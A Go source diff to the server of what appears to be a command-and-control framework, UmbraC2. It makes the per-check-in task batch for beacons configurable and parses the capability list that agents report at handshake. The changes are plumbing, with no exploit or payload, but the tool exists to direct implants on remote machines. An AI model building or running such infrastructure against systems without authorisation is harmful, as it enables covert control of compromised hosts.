@@ -5,8 +5,10 @@ import (
 	"fmt"
 	"log/slog"
 	"net"
+	"strings"
 	"time"
 
+	"github.com/thesyntax1/UmbraC2/server/internal/config"
 	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
 	"github.com/thesyntax1/UmbraC2/server/internal/hub"
 	"github.com/thesyntax1/UmbraC2/server/internal/session"
@@ -28,8 +30,9 @@ type AgentLink struct {
 	closed bool
 }
 
-// MaxTasksPerCycle bounds how much work one beacon response can carry.
-const MaxTasksPerCycle = 64
+// MaxTasksPerCycle is the fallback for how much work one beacon response
+// carries when the server has no configuration to say otherwise.
+const MaxTasksPerCycle = config.DefaultMaxTaskBatch
 
 // HandleFrame processes one inbound frame and returns the frames to send back.
 // A nil return value means "nothing to say right now".
@@ -82,8 +85,20 @@ func (l *AgentLink) HandleFrame(raw []byte) ([][]byte, error) {
 // Closed reports whether the agent asked to end the session.
 func (l *AgentLink) Closed() bool { return l.closed }
 
+// maxTasksPerCycle is how much work one beacon response may carry.
+//
+// The limit is the operator's: a slow beacon on a metered link gets a
+// smaller batch, and a busy one gets a bigger one.  It always stays within
+// the frame budget, because the whole batch travels in a single frame.
+func (l *AgentLink) maxTasksPerCycle() int {
+	if l.Hub == nil || l.Hub.Config() == nil {
+		return MaxTasksPerCycle
+	}
+	return l.Hub.Config().MaxTaskBatch()
+}
+
 func (l *AgentLink) onCheckin(msg map[string]any) ([][]byte, error) {
-	tasks := l.Hub.NextTasks(l.AgentID, MaxTasksPerCycle)
+	tasks := l.Hub.NextTasks(l.AgentID, l.maxTasksPerCycle())
 	sleep, jitter, obfuscate := l.Hub.PolicyFull(l.AgentID)
 
 	encoded := make([]any, 0, len(tasks))
@@ -242,6 +257,7 @@ func AgentMeta(info *HelloInfo, transport, addr string, sleep, jitter int) *stor
 		Addr:      addr,
 		Sleep:     sleep,
 		Jitter:    jitter,
+		Caps:      metaCaps(meta["caps"]),
 	}
 	if rec.Host == "" {
 		rec.Host = str("hostname")
@@ -250,6 +266,35 @@ func AgentMeta(info *HelloInfo, transport, addr string, sleep, jitter int) *stor
 		rec.Version = "unknown"
 	}
 	return rec
+}
+
+// metaCaps reads the capability list out of the handshake metadata.
+//
+// A beacon advertises the task kinds it implements, so the server never
+// queues work the target cannot run.  The list arrives as an array of
+// strings; anything else is ignored and the agent is treated as one that
+// did not say (which means it may be asked for anything).
+func metaCaps(raw any) []string {
+	items, ok := raw.([]any)
+	if !ok {
+		return nil
+	}
+	out := make([]string, 0, len(items))
+	for _, item := range items {
+		s, ok := item.(string)
+		if !ok {
+			continue
+		}
+		s = strings.TrimSpace(s)
+		if s == "" {
+			continue
+		}
+		out = append(out, s)
+	}
+	if len(out) == 0 {
+		return nil
+	}
+	return out
 }
 
 // serveAgentTCP runs a full TCP beacon session: handshake, then frames until
